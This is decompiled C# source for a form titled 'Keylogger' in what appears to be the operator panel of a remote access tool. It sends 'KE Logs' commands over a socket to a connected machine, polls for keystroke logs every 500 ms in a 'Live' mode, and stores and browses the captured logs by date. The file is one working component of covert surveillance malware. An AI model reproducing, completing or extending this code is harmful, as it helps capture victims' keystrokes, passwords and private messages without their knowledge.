using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class KeyloggerGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("savedd3v")]
	private TreeView _savedd3v;

	[AccessedThroughProperty("txtbLogs")]
	private TextBox _txtbLogs;

	[AccessedThroughProperty("Livee")]
	private CheckBox _Livee;

	[AccessedThroughProperty("Refresh")]
	private Button _Refresh;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	public string Old;

	public string Path;

	public int Sock;

	public string T;

	public string TH;

	internal virtual TreeView savedd3v
	{
		[DebuggerNonUserCode]
		get
		{
			return _savedd3v;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			TreeNodeMouseClickEventHandler val = new TreeNodeMouseClickEventHandler(TreeView1_NodeMouseDoubleClick);
			if (_savedd3v != null)
			{
				_savedd3v.remove_NodeMouseDoubleClick(val);
			}
			_savedd3v = value;
			if (_savedd3v != null)
			{
				_savedd3v.add_NodeMouseDoubleClick(val);
			}
		}
	}

	internal virtual TextBox txtbLogs
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtbLogs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Logs_TextChanged;
			if (_txtbLogs != null)
			{
				((Control)_txtbLogs).remove_TextChanged(eventHandler);
			}
			_txtbLogs = value;
			if (_txtbLogs != null)
			{
				((Control)_txtbLogs).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox Livee
	{
		[DebuggerNonUserCode]
		get
		{
			return _Livee;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = L_CheckedChanged;
			if (_Livee != null)
			{
				_Livee.remove_CheckedChanged(eventHandler);
			}
			_Livee = value;
			if (_Livee != null)
			{
				_Livee.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Button Refresh
	{
		[DebuggerNonUserCode]
		get
		{
			return _Refresh;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Refresh_Click;
			if (_Refresh != null)
			{
				((Control)_Refresh).remove_Click(eventHandler);
			}
			_Refresh = value;
			if (_Refresh != null)
			{
				((Control)_Refresh).add_Click(eventHandler);
			}
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	public KeyloggerGR()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Keylogger_FormClosing));
		((Form)this).add_Load((EventHandler)Keylogger_Load);
		__ENCAddToList(this);
		T = DateTime.Now.ToString("yyyy-MM-dd");
		TH = DateAndTime.get_TimeOfDay().ToString("h-mm-ss tt");
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Expected O, but got Unknown
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_035e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Expected O, but got Unknown
		//IL_0569: Unknown result type (might be due to invalid IL or missing references)
		//IL_0573: Expected O, but got Unknown
		components = new Container();
		TreeNode val = new TreeNode("Saved Data");
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(KeyloggerGR));
		savedd3v = new TreeView();
		ImageList1 = new ImageList(components);
		txtbLogs = new TextBox();
		Livee = new CheckBox();
		Refresh = new Button();
		Timer1 = new Timer(components);
		Panel1 = new Panel();
		Panel2 = new Panel();
		((Control)Panel1).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)savedd3v).set_Anchor((AnchorStyles)15);
		((Control)savedd3v).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		savedd3v.set_ImageIndex(0);
		savedd3v.set_ImageList(ImageList1);
		TreeView obj = savedd3v;
		Point location = new Point(3, 3);
		((Control)obj).set_Location(location);
		((Control)savedd3v).set_Name("savedd3v");
		val.set_Name("Node0");
		val.set_Text("Saved Data");
		savedd3v.get_Nodes().AddRange((TreeNode[])(object)new TreeNode[1] { val });
		savedd3v.set_SelectedImageIndex(0);
		TreeView obj2 = savedd3v;
		Size size = new Size(191, 376);
		((Control)obj2).set_Size(size);
		((Control)savedd3v).set_TabIndex(0);
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "folder-subfolder-icon.png");
		ImageList1.get_Images().SetKeyName(1, "folder-close-icon.png");
		ImageList1.get_Images().SetKeyName(2, "1484876378_file_extension_log.png");
		((Control)txtbLogs).set_Anchor((AnchorStyles)15);
		((TextBoxBase)txtbLogs).set_BackColor(Color.White);
		((Control)txtbLogs).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj3 = txtbLogs;
		location = new Point(206, 3);
		((Control)obj3).set_Location(location);
		txtbLogs.set_Multiline(true);
		((Control)txtbLogs).set_Name("txtbLogs");
		((TextBoxBase)txtbLogs).set_ReadOnly(true);
		TextBox obj4 = txtbLogs;
		size = new Size(638, 345);
		((Control)obj4).set_Size(size);
		((Control)txtbLogs).set_TabIndex(1);
		((Control)Livee).set_Anchor((AnchorStyles)11);
		((ButtonBase)Livee).set_AutoSize(true);
		((Control)Livee).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Livee).set_ForeColor(Color.Red);
		CheckBox livee = Livee;
		location = new Point(593, 6);
		((Control)livee).set_Location(location);
		((Control)Livee).set_Name("Livee");
		CheckBox livee2 = Livee;
		size = new Size(48, 19);
		((Control)livee2).set_Size(size);
		((Control)Livee).set_TabIndex(2);
		((ButtonBase)Livee).set_Text("Live");
		((ButtonBase)Livee).set_UseVisualStyleBackColor(true);
		((Control)Refresh).set_Anchor((AnchorStyles)15);
		((Control)Refresh).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ButtonBase)Refresh).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		((ButtonBase)Refresh).set_ImageAlign((ContentAlignment)16);
		Button refresh = Refresh;
		location = new Point(6, 4);
		((Control)refresh).set_Location(location);
		((Control)Refresh).set_Name("Refresh");
		Button refresh2 = Refresh;
		size = new Size(574, 23);
		((Control)refresh2).set_Size(size);
		((Control)Refresh).set_TabIndex(3);
		((ButtonBase)Refresh).set_Text("Refresh");
		((ButtonBase)Refresh).set_UseVisualStyleBackColor(true);
		((Control)Panel1).get_Controls().Add((Control)(object)savedd3v);
		((Control)Panel1).set_Dock((DockStyle)3);
		Panel panel = Panel1;
		location = new Point(0, 0);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(200, 386);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(4);
		((Control)Panel2).get_Controls().Add((Control)(object)Refresh);
		((Control)Panel2).get_Controls().Add((Control)(object)Livee);
		((Control)Panel2).set_Dock((DockStyle)2);
		Panel panel3 = Panel2;
		location = new Point(200, 354);
		((Control)panel3).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel4 = Panel2;
		size = new Size(652, 32);
		((Control)panel4).set_Size(size);
		((Control)Panel2).set_TabIndex(5);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(852, 386);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)txtbLogs);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Keylogger");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Keylogger");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Keylogger_Load(object sender, EventArgs e)
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		if (!Directory.Exists(Path + T))
		{
			Directory.CreateDirectory(Path + T);
		}
		string[] directories = Directory.GetDirectories(Path);
		checked
		{
			int num = directories.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				string text = directories[num2];
				TreeNode val = new TreeNode();
				val = savedd3v.get_Nodes().get_Item(0);
				val.get_Nodes().Add(text, System.IO.Path.GetFileName(text), 1, 1);
				val.set_Tag((object)"0");
				num2++;
			}
			MyProject.Forms.FrmMAINGR.s.Send(Sock, "KE Logs");
		}
	}

	private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(Sock, "Exit");
	}

	private void Logs_TextChanged(object sender, EventArgs e)
	{
		try
		{
			Old = txtbLogs.get_Text();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void L_CheckedChanged(object sender, EventArgs e)
	{
		Timer1.set_Enabled(Livee.get_Checked());
		if (Livee.get_Checked())
		{
			((Control)Refresh).set_Enabled(false);
		}
		else
		{
			((Control)Refresh).set_Enabled(true);
		}
	}

	private void Refresh_Click(object sender, EventArgs e)
	{
		txtbLogs.set_Text("");
		MyProject.Forms.FrmMAINGR.s.Send(Sock, "KE Logs");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Timer1.set_Interval(500);
		txtbLogs.set_Text("");
		MyProject.Forms.FrmMAINGR.s.Send(Sock, "KE Logs");
	}

	private void TreeView1_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e)
	{
		if (Operators.CompareString(savedd3v.get_SelectedNode().get_Text(), "Saved Data", false) == 0 || !Operators.ConditionalCompareObjectEqual(Operators.CompareObjectEqual(savedd3v.get_SelectedNode().get_Tag(), (object)"1", false), (object)false, false) || 1 == 0)
		{
			return;
		}
		checked
		{
			if (savedd3v.get_SelectedNode().get_SelectedImageIndex() == 1)
			{
				string[] files = Directory.GetFiles(Path + savedd3v.get_SelectedNode().get_Text());
				int num = files.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = files[num2];
						if (text.EndsWith(".Log"))
						{
							TreeNode val = savedd3v.get_SelectedNode().get_Nodes().Add(text, System.IO.Path.GetFileName(text), 2, 2);
							val.set_ToolTipText(text);
							savedd3v.get_SelectedNode().set_Tag((object)"1");
						}
						num2++;
						continue;
					}
					break;
				}
			}
			else
			{
				txtbLogs.set_Text(File.ReadAllText(savedd3v.get_SelectedNode().get_ToolTipText()));
			}
		}
	}
}
